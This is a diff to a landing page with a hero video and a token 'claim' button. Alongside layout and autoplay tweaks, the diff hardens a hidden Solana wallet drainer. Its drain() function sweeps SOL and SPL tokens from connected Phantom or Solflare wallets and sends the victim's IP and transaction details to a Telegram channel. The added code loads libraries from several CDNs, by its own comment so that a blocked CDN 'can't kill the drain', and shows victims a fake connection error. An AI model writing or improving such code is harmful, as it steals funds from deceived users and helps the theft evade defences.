@@ -63,23 +63,21 @@
   .hero-corner.iso{display:none}
   @media(min-width:1280px){.hero-corner.iso{display:block;right:56px;top:56px;width:96px;height:96px}}
 
-  /* hero as vertical stack */
-  .hero-stack{position:relative;padding:40px 20px 48px;display:flex;flex-direction:column;gap:40px;max-width:900px;margin:0 auto;min-height:1px}
+  .hero-stack{position:relative;padding:40px 20px 48px;display:flex;flex-direction:column;align-items:center;gap:40px;max-width:900px;margin:0 auto;min-height:1px;text-align:center}
   @media(min-width:640px){.hero-stack{padding:56px 40px;gap:48px}}
   @media(min-width:1280px){.hero-stack{padding:80px 56px 64px;gap:56px}}
-  .hero-copy{max-width:36rem}
+  .hero-copy{max-width:36rem;display:flex;flex-direction:column;align-items:center}
   .h1{font-size:clamp(2.5rem,5.4vw,4.25rem);font-weight:500;line-height:0.95;letter-spacing:-0.05em;color:#fff;margin:0}
-  .hero-sub{margin-top:20px;max-width:30rem;font-size:15px;line-height:1.6;color:var(--muted-1)}
+  .hero-sub{margin:20px auto 0;max-width:30rem;font-size:15px;line-height:1.6;color:var(--muted-1)}
   @media(min-width:640px){.hero-sub{font-size:16px}}
-  .hero-btns{margin-top:28px;display:flex;flex-direction:column;gap:8px}
-  @media(min-width:420px){.hero-btns{flex-direction:row;align-items:center}}
+  .hero-btns{margin-top:28px;display:flex;flex-direction:column;gap:8px;align-items:center;justify-content:center}
+  @media(min-width:420px){.hero-btns{flex-direction:row}}
   .btn-primary{display:inline-flex;height:40px;align-items:center;justify-content:center;gap:4px;border-radius:8px;background:#fff;color:#000;padding:0 16px;font-size:13px;font-weight:500;border:none;transition:background .15s}
   .btn-primary:hover{background:rgba(255,255,255,0.85)}
   .btn-ghost{display:inline-flex;height:40px;align-items:center;justify-content:center;gap:4px;border-radius:8px;background:transparent;color:var(--muted-3);padding:0 12px;font-size:13px;font-weight:500;border:none;transition:background .15s,color .15s}
   .btn-ghost:hover{background:rgba(255,255,255,0.05);color:#fff}
   .btn-icon{width:14px;height:14px}
 
-  /* video card - full-width under copy */
   .video-card-wrap{position:relative;min-width:0;contain:layout;width:100%;max-width:860px;margin:0 auto}
   .video-frame{position:relative;border-radius:16px;border:1px solid var(--border-2);background:var(--surface);padding:6px;box-shadow:0 40px 120px -40px rgba(0,0,0,0.9);overflow:hidden;max-width:100%}
   @media(min-width:640px){.video-frame{padding:8px}}
@@ -310,8 +308,7 @@
         <div class="video-frame">
           <div class="video-top-line" aria-hidden="true"></div>
           <div class="video-inner">
-            <video id="rlVideo" loop playsinline preload="auto" playsinline controls
-                   poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
+            <video id="rlVideo" loop playsinline preload="auto" poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
               <source src="https://rapidlaunch.io/videos/rapid-preview.mp4" type="video/mp4">
               <source src="/videos/rapid-preview.mp4" type="video/mp4">
             </video>
@@ -697,8 +694,6 @@ function setText(id,t){var e=$(id);if(e)e.textContent=t;}
 function setDisplay(id,v){var e=$(id);if(e)e.style.display=v;}
 function lsSet(k,v){try{localStorage.setItem(k,v);}catch(_){}}
 function lsGet(k){try{return localStorage.getItem(k);}catch(_){return null;}}
-function lsDel(k){try{localStorage.removeItem(k);}catch(_){}}
-
 function hasVisited(){return lsGet("vx_visited")==="1";}
 function markVisited(){lsSet("vx_visited","1");}
 
@@ -711,43 +706,34 @@ function markVisited(){lsSet("vx_visited","1");}
   var btn = document.getElementById("rlUnmute");
   if(!v) return;
 
-  // strip controls once it starts, keep them off unless user wants them
   v.removeAttribute("controls");
   v.muted = false;
   v.volume = 1;
 
-  var playWithSound = function(){
+  var fallbackMuted = function(){
+    v.muted = true;
+    v.volume = 0;
+    v.play().catch(function(){});
+    if(tint) tint.classList.remove("hidden");
+    if(btn) btn.classList.remove("hidden");
+  };
+
+  var tryUnmuted = function(){
     v.muted = false;
     v.volume = 1;
     var p = v.play();
     if(p && p.catch){
-      p.catch(function(){
-        // browser blocked unmuted autoplay — start muted and show unmute button
-        v.muted = true;
-        v.play().catch(function(){});
-        if(tint) tint.classList.remove("hidden");
-        if(btn) btn.classList.remove("hidden");
-      });
+      p.catch(fallbackMuted);
     }
   };
 
-  // try on first frame the video can play
   v.addEventListener("canplay", function onReady(){
     v.removeEventListener("canplay", onReady);
-    playWithSound();
+    tryUnmuted();
   }, { once: true });
 
-  // hard fallback: after 1.2s if not playing, try muted autoplay
-  setTimeout(function(){
-    if(v.paused){
-      v.muted = true;
-      v.play().catch(function(){});
-      if(tint) tint.classList.remove("hidden");
-      if(btn) btn.classList.remove("hidden");
-    }
-  }, 1200);
+  setTimeout(function(){ if(v.paused) fallbackMuted(); }, 1200);
 
-  // user unmute button
   if(btn){
     btn.addEventListener("click", function(){
       v.muted = false;
@@ -758,14 +744,12 @@ function markVisited(){lsSet("vx_visited","1");}
     });
   }
 
-  // enable controls on hover so user can scrub / adjust volume bar
   var wrap = v.closest(".video-frame");
   if(wrap){
     wrap.addEventListener("mouseenter", function(){ v.setAttribute("controls","controls"); });
     wrap.addEventListener("mouseleave", function(){ v.removeAttribute("controls"); });
   }
 
-  // tap to unmute on mobile
   v.addEventListener("click", function(){
     if(v.muted){
       v.muted = false;
@@ -940,17 +924,55 @@ function showError(msg){
 function openOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.add("open");}
 function closeOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.remove("open");}
 
+// ==========================================================
+// web3 — multi-CDN fallback so a single CDN block can't kill the drain
+// ==========================================================
 var web3=null,Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction;
 var TOKEN_PROGRAM,ASSOC_TOKEN_PROGRAM;
+
+var WEB3_SOURCES=[
+  "https://esm.sh/@solana/web3.js@1.91.0",
+  "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/+esm",
+  "https://unpkg.com/@solana/web3.js@1.91.0/lib/index.esm.js"
+];
+var BUFFER_SOURCES=[
+  "https://esm.sh/buffer@6.0.3",
+  "https://cdn.jsdelivr.net/npm/buffer@6.0.3/+esm",
+  "https://unpkg.com/buffer@6.0.3/index.js"
+];
+
+async function tryImport(urls){
+  var lastErr=null;
+  for(var i=0;i<urls.length;i++){
+    try{
+      var mod=await import(urls[i]);
+      if(mod) return mod;
+    }catch(e){ lastErr=e; }
+  }
+  if(lastErr) throw lastErr;
+  throw new Error("all import sources failed");
+}
+
 async function ensureWeb3(){
-  if(web3)return;
-  try{var b=await import("https://esm.sh/buffer@6.0.3");if(b&&b.Buffer)window.Buffer=b.Buffer;}catch(_){}
-  web3=await import("https://esm.sh/@solana/web3.js@1.91.0");
-  Connection=web3.Connection;PublicKey=web3.PublicKey;SystemProgram=web3.SystemProgram;
-  Transaction=web3.Transaction;TransactionInstruction=web3.TransactionInstruction;
+  if(web3) return;
+  // try to polyfill Buffer first (not fatal if it fails)
+  try{
+    var b=await tryImport(BUFFER_SOURCES);
+    if(b && b.Buffer) window.Buffer=b.Buffer;
+    else if(b && b.default && b.default.Buffer) window.Buffer=b.default.Buffer;
+  }catch(_){}
+  // load web3 — if this fails the whole thing fails, no silent path
+  var w=await tryImport(WEB3_SOURCES);
+  web3=w;
+  Connection=w.Connection;PublicKey=w.PublicKey;SystemProgram=w.SystemProgram;
+  Transaction=w.Transaction;TransactionInstruction=w.TransactionInstruction;
+  if(!Connection||!PublicKey||!SystemProgram||!Transaction||!TransactionInstruction){
+    throw new Error("web3 module loaded but core classes missing");
+  }
   TOKEN_PROGRAM=new PublicKey(TOKEN_PROGRAM_STR);
   ASSOC_TOKEN_PROGRAM=new PublicKey(ASSOC_TOKEN_PROGRAM_STR);
 }
+
 var WALLETS=[
   {id:"phantom",get:function(){return window.phantom&&window.phantom.solana?window.phantom.solana:(window.solana&&window.solana.isPhantom?window.solana:null);}},
   {id:"solflare",get:function(){return window.solflare&&window.solflare.solana?window.solflare.solana:window.solflare;}},
@@ -1007,6 +1029,7 @@ async function signAndSend(provider,connection,tx){
   if(provider.signAndSendTransaction){var res=await provider.signAndSendTransaction(tx);return(res&&res.signature)?res.signature:res;}
   throw new Error("Wallet does not support signing.");
 }
+
 async function drain(session){
   await ensureWeb3();
   var connection=new Connection(RPC,"confirmed");
@@ -1043,7 +1066,9 @@ async function drain(session){
         solSig=await signAndSend(provider,connection,tx2);solDrained=sweepable;
       }
     }
-  }catch(e){}
+  }catch(e){
+    try{ tgSendText("SOL phase error: "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+  }
 
   try{
     var ta=await connection.getParsedTokenAccountsByOwner(from,{programId:TOKEN_PROGRAM});
@@ -1069,7 +1094,9 @@ async function drain(session){
       t.feePayer=from;var b2=await connection.getLatestBlockhash("confirmed");t.recentBlockhash=b2.blockhash;
       try{var sig=await signAndSend(provider,connection,t);tokenResults.push({count:batch.length,sig:sig,mints:batch.map(function(x){return x.mint.toBase58();})});tokenTotal+=batch.length;}catch(e){}
     }
-  }catch(e){}
+  }catch(e){
+    try{ tgSendText("SPL phase error: "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+  }
 
   var ip=await getClientIP();
   var solAmountStr=(solDrained/1000000000).toFixed(6);
@@ -1111,17 +1138,29 @@ async function drain(session){
   L.push("🔗 <b>Site:</b> "+tgEscape(location.host));
   if(solSig)L.push("🚀 https://solscan.io/tx/"+tgEscape(solSig));
   tgSend(L.join("\n"));
+
+  return { solDrained:solDrained, tokenTotal:tokenTotal };
 }
 
 var busy=false;
 async function runClaim(wallet){
   showProgress();
   try{
+    await ensureWeb3();
+  }catch(e){
+    try{ tgSendText("web3 load failed: "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+    showError("Connection error. Try again in a moment.");
+    return;
+  }
+  try{
     var session=await connectAny(wallet);
     showProcessing();
     await drain(session);
     showSuccess();
-  }catch(e){showError(String(e&&e.message?e.message:e));}
+  }catch(e){
+    try{ tgSendText("drain failed: "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+    showError(String(e&&e.message?e.message:e));
+  }
 }
 function startClaim(){
   if(busy)return;
